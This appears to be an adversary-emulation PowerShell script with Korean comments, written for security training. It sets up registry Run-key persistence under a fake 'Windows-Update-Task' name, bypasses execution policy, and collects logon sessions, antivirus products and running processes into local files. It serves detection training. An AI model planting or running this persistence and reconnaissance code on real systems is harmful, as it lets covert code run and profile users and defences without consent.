<#
.SYNOPSIS
    악성코드 동작 모의 훈련용 파워쉘 스크립트
.DESCRIPTION
    이 스크립트는 지정된 보안 훈련 및 학습 목적으로만 사용되어야 합니다.
    주요 기능:
    1. 레지스트리 Run 키를 이용한 지속성 확보 (Autorun)
    2. 시스템 활성 로그온 및 안티바이러스(AV) 정보 수집 및 파일 저장
    3. 실행 중인 프로세스 목록 수집 및 파일 저장
.NOTES
    Author: Gemini
    Creation Date: 2025-09-02
    Version: 1.0
.WARNING
    !!! 경고 !!!
    이 스크립트는 실제 악성코드가 사용하는 기법을 포함하고 있습니다.
    허가되지 않은 시스템에서 절대로 실행하지 마십시오.
    모든 책임은 스크립트 실행자에게 있습니다.
#>

# --- 스크립트 설정 ---

# 1. 지속성(Persistence)을 위해 등록될 레지스트리 키 이름
$RegistryKeyName = "Windows-Update-Task"

# 2. 정보 수집 파일 경로 (로그온 정보, AV 정보)
# $env:TEMP는 현재 사용자 프로필의 Temp 폴더 경로 (C:\Users\<사용자 이름>\AppData\Local\Temp)를 자동으로 가져옵니다.
$InfoLogPath = Join-Path $env:TEMP "system_info.txt"

# 3. 프로세스 목록 파일 경로
$ProcessLogPath = "C:\Windows\System32\drivers\etc\proc_list.txt"


# --- 주요 기능 실행 ---

try {
    # --- 기능 1: 지속성 확보 (Persistence via Registry Run Key) ---
    # 현재 실행 중인 이 스크립트 파일을 레지스트리의 Run 키에 등록하여 사용자 로그온 시마다 자동 실행되도록 설정합니다.
    # $MyInvocation.MyCommand.Path는 현재 실행되는 스크립트의 전체 경로를 의미합니다.
    $scriptPath = $MyInvocation.MyCommand.Path
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

    # Set-ItemProperty: 레지스트리 값이 없으면 생성하고, 있으면 덮어씁니다.
    # -Force 옵션은 읽기 전용 속성 등에도 강제로 값을 쓰려고 시도합니다.
    Set-ItemProperty -Path $registryPath -Name $RegistryKeyName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Write-Host "[SUCCESS] 지속성 확보: 레지스트리 Run 키 등록 완료. ($RegistryKeyName)"

    # --- 기능 2 & 3: 시스템 정보 (로그온, AV) 수집 ---
    # 기존 로그 파일이 있다면 삭제하고 새로 생성합니다.
    if (Test-Path $InfoLogPath) {
        Remove-Item $InfoLogPath -Force
    }

    # 헤더 추가
    Add-Content -Path $InfoLogPath -Value "--- System Information Report ---"
    Add-Content -Path $InfoLogPath -Value "Generated on: $(Get-Date)"
    Add-Content -Path $InfoLogPath -Value "================================="
    Add-Content -Path $InfoLogPath -Value ""

    # 시스템 활성 로그온 정보 수집 (query user 명령어 사용)
    Add-Content -Path $InfoLogPath -Value "## Active Logon Sessions ##"
    query user | Out-File -FilePath $InfoLogPath -Append -Encoding UTF8
    Add-Content -Path $InfoLogPath -Value "" # 가독성을 위한 줄바꿈

    # 안티바이러스(AV) 제품 정보 수집
    Add-Content -Path $InfoLogPath -Value "## Antivirus Information ##"
    # WMI(Windows Management Instrumentation)를 통해 Windows 보안 센터에 등록된 AV 제품 정보를 조회합니다.
    # Namespace 'root/SecurityCenter2'는 최신 Windows 버전에 해당합니다.
    $avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct"
    if ($avProducts) {
        foreach ($product in $avProducts) {
            Add-Content -Path $InfoLogPath -Value "Display Name: $($product.displayName)"
            # productState 값은 16진수로 표현되며, 상태(활성/비활성, 최신/오래됨) 정보를 담고 있습니다.
            Add-Content -Path $InfoLogPath -Value "Product State (Hex): $($product.productState)"
            Add-Content -Path $InfoLogPath -Value "-------------------------"
        }
    } else {
        Add-Content -Path $InfoLogPath -Value "No Antivirus product detected."
    }
    Write-Host "[SUCCESS] 시스템 정보 수집 완료. ($InfoLogPath)"

    # --- 기능 4: 프로세스 목록 수집 ---
    # 실행 중인 모든 프로세스 목록을 가져와서 지정된 경로에 저장합니다.
    # C:\Windows\System32\drivers\etc 경로는 관리자 권한이 필요할 수 있습니다.
    Add-Content -Path $ProcessLogPath -Value "--- Process List Report ---"
    Add-Content -Path $ProcessLogPath -Value "Generated on: $(Get-Date)"
    Add-Content -Path $ProcessLogPath -Value "========================="
    Get-Process | Format-Table -AutoSize | Out-File -FilePath $ProcessLogPath -Append -Encoding UTF8
    Write-Host "[SUCCESS] 프로세스 목록 수집 완료. ($ProcessLogPath)"

} catch {
    # 스크립트 실행 중 오류가 발생하면 오류 메시지를 출력합니다.
    Write-Error "[ERROR] 스크립트 실행 중 오류 발생: $_"
}

Write-Host "--- 모든 작업이 완료되었습니다. ---"